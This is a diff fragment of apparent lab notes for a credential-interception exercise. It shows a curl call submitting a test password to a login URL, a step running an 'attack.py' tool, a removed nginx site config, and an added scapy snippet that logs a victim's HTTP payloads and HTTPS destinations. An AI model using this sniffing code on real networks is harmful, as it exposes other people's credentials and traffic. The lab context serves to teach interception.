@@ -26,27 +26,26 @@ sudo openssl req -new -x509 \
  curl -k -L "https://secure-login.com/submit?password=SECRET123"
 
 sudo tail -f /var/log/nginx/access.log
+ps -p $(ps -o ppid= -p $$) -o comm=
 
 Attack
 sudo python3 /opt/tools/attack.py
 
 
 
-
-
-
-server {
-    listen 192.168.50.60:80;
-    server_name unsecure-login.com;
-
-    root /var/www/unsecure-login.com;
-    index unsecure-login.html;
-
-    location /submit {
-        return 200 "Submitted\n";
-    }
-    
-    location / {
-        try_files $uri $uri/ =404;
-    }
-}
+        """# Check for HTTP packets from victim
+        elif packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80:
+            dst = packet[scapy.IP].dst
+            msg = f"[HTTP] {victim_ip} -> {dst}:80"
+            payload = None
+            
+            # Extract HTTP payload
+            if packet.haslayer(scapy.Raw):
+                    payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore').rstrip("\n")
+            
+            log_packet(msg, payload)
+        
+        # Check for HTTPS packets from victim
+        elif packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 443:
+            dst = packet[scapy.IP].dst           
+            log_packet(f"[HTTPS] {victim_ip} -> {dst}:443")"""
